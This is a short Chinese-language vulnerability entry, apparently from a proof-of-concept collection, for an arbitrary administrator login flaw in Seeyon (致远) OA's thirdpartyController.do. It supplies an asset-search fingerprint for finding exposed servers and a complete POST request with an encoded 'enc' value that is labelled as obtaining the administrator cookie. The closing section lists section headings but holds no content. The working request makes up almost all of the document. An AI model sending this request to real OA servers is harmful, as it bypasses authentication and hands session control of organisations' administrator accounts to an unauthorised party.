# 致远OAthirdpartyController.do任意管理员登陆漏洞

- **系统**：致远OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="致远 OA"`
- **请求**：`POST /seeyon/thirdpartyController.do HTTP/1.1`

**请求体 / payload**
```
使用poc获取管理员cookie
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 133
method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1

```

**其他**
- 致远OA thirdpartyController.do 任意管理员登陆漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远OA